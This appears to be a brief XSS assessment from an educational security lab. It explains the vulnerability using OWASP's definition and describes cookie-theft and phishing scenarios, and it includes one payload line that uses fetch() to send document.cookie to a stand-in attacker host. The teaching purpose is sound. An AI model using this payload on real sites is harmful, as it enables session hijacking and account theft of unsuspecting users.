# XSS Vulnerability Assessment

[Browse project files](#explore-the-project)


## Vulnerability Type
The application is vulnerable to **Cross-Site Scripting (XSS)**. According to **OWASP** (Open Worldwide Application Security Project), XSS occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows attackers to execute malicious scripts in the victim's browser.

## Exploitation Scenarios
1. **Session Hijacking (Cookie Theft):** 
   An attacker can inject a payload that sends the victim's session cookie to a server controlled by the attacker. Example: `<script>fetch('http://attacker.com/?cookie=' + document.cookie)</script>`. This allows the attacker to take over the victim's account.

2. **Website Defacement & Phishing:**
   The attacker can inject HTML/JS to modify the visual appearance of the page or present a fake login form. When users try to log in, their credentials are sent directly to the attacker instead of the legitimate server.

## Explore the project

- [Fix.md](Fix.md)
- [cyber0x0.1.00 (1)/pro_00/index.html](cyber0x0.1.00%20%281%29/pro_00/index.html)

## Lab scope

Educational security exercise. Review the assessment and remediation notes together; run vulnerable applications only in an isolated, authorized lab.
